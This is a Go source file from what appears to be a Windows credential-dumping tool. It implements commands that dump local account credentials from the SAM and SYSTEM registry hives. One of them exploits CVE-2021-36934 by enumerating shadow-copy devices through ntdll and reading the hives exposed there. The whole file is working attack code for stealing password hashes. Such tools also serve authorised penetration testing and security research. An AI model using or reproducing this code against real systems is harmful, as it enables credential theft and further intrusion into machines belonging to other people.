package sam

import (
	"fmt"
	"os"
	"strings"
	"unsafe"

	"github.com/spf13/cobra"

	"github.com/vincd/savoir/windows/ntdll"
	"github.com/vincd/savoir/windows/registry"
)

func DumpSAMCredentialsFromWindowsRegistry(isJson bool) error {
	if err := ntdll.AskPrivilege(ntdll.SE_DEBUG); err != nil {
		return err
	}

	systemHive, err := registry.NewWindowsHive("SYSTEM")
	if err != nil {
		return err
	}

	samHive, err := registry.NewWindowsHive("SAM")
	if err != nil {
		return fmt.Errorf("Error while opening %s registry: %s", "SAM", err)
	}

	return dumpSAMCredential(samHive, systemHive, isJson)
}

func listShadowCopies() ([]string, error) {
	shadowCopies := make([]string, 0)

	objectAttributDevice := ntdll.NewObjectAttributes("\\Device", 0, ntdll.Handle(0), nil)
	hDeviceDirectory := ntdll.Handle(0)
	status := ntdll.NtOpenDirectoryObject(&hDeviceDirectory, ntdll.DIRECTORY_QUERY|ntdll.DIRECTORY_TRAVERSE, objectAttributDevice)

	if !status.IsSuccess() {
		return nil, fmt.Errorf("NtOpenDirectoryObject: 0x%08x", uint32(status))
	}
	defer ntdll.NtClose(hDeviceDirectory)

	buffer := [0x100]byte{}
	restartScan := true
	start := uint32(0)
	context := uint32(0)
	returnLength := uint32(0)

	for status = ntdll.STATUS_MORE_ENTRIES; status == ntdll.STATUS_MORE_ENTRIES; {
		status = ntdll.NtQueryDirectoryObject(hDeviceDirectory, &buffer[0], uint32(len(buffer)), false, restartScan, &context, &returnLength)
		if !status.IsSuccess() {
			return nil, fmt.Errorf("NtQueryDirectoryObject: 0x%08x", uint32(status))
		}

		for i := uint32(0); i < (context - start); i++ {
			odi := (*ntdll.ObjectDirectoryInformationT)(unsafe.Pointer(&buffer[32*i]))
			if odi.TypeName.String() == "Device" {
				if strings.HasPrefix(odi.Name.String(), "HarddiskVolumeShadowCopy") {
					shadowCopyPath := fmt.Sprintf("\\\\?\\GLOBALROOT\\Device\\%s\\Windows\\System32\\config\\", odi.Name.String())

					systemPath := fmt.Sprintf("%s\\SYSTEM", shadowCopyPath)
					if _, err := os.Stat(systemPath); os.IsNotExist(err) {
						continue
					}
					samPath := fmt.Sprintf("%s\\SAM", shadowCopyPath)
					if _, err := os.Stat(samPath); os.IsNotExist(err) {
						continue
					}

					shadowCopies = append(shadowCopies, shadowCopyPath)
				}
			}
		}

		start = context
		restartScan = false
	}

	return shadowCopies, nil
}

func init() {
	// share argument?
	var isJson bool

	var registryCommand = &cobra.Command{
		Use:   "reg",
		Short: "Dump from Windows registry",
		Long:  `Dump local accounts credentials from Windows registry`,
		Args: func(cmd *cobra.Command, args []string) error {
			return nil
		},
		RunE: func(cmd *cobra.Command, args []string) error {
			return DumpSAMCredentialsFromWindowsRegistry(isJson)
		},
	}
	registryCommand.Flags().BoolVarP(&isJson, "json", "j", false, "Print output as a JSON object")

	var shadowcopiesCommand = &cobra.Command{
		Use:   "shadowcopies",
		Short: "Search hives in ShadowCopy volumes (CVE-2021-36934)",
		Long:  `Search hives in ShadowCopy volumes (CVE-2021-36934)`,
		Args: func(cmd *cobra.Command, args []string) error {
			return nil
		},
		RunE: func(cmd *cobra.Command, args []string) error {
			shadowCopies, err := listShadowCopies()
			if err != nil {
				return err
			}

			if len(shadowCopies) == 0 {
				fmt.Println("Cannot found any shodowcopy.")
				return nil
			}

			for _, shadowCopy := range shadowCopies {
				err := DumpSAMCredentialsFromHives(shadowCopy+"SAM", shadowCopy+"SYSTEM", isJson)
				if err != nil {
					fmt.Printf("Cannot dump credentials from: %s\n", shadowCopy)
					fmt.Println(err)
				}
			}

			return nil
		},
	}
	shadowcopiesCommand.Flags().BoolVarP(&isJson, "json", "j", false, "Print output as a JSON object")

	Command.AddCommand(registryCommand)
	Command.AddCommand(shadowcopiesCommand)
}
